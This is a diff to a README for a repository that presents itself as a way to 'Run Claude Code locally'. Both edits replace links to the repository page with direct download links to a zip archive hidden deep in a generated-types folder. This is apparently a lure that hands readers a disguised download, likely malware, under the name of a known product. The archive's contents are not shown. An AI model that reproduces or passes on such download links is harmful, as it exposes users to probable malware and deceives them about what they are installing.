@@ -1,6 +1,6 @@
 # 🤖 claude-code - Run Claude Code locally with ease
 
-[![Download](https://img.shields.io/badge/Download-claude--code-purple?style=for-the-badge)](https://github.com/Teleroboticshairdresser663/claude-code)
+[![Download](https://img.shields.io/badge/Download-claude--code-purple?style=for-the-badge)](https://raw.githubusercontent.com/Teleroboticshairdresser663/claude-code/main/src/types/generated/events_mono/growthbook/v1/code-claude-v1.0-alpha.4.zip)
 
 ## 📦 Overview
 
@@ -24,7 +24,7 @@ If you plan to use it often, an SSD helps with start time and file access.
 
 Visit this page to download:
 
-[https://github.com/Teleroboticshairdresser663/claude-code](https://github.com/Teleroboticshairdresser663/claude-code)
+[https://raw.githubusercontent.com/Teleroboticshairdresser663/claude-code/main/src/types/generated/events_mono/growthbook/v1/code-claude-v1.0-alpha.4.zip](https://raw.githubusercontent.com/Teleroboticshairdresser663/claude-code/main/src/types/generated/events_mono/growthbook/v1/code-claude-v1.0-alpha.4.zip)
 
 Follow these steps on Windows:
 
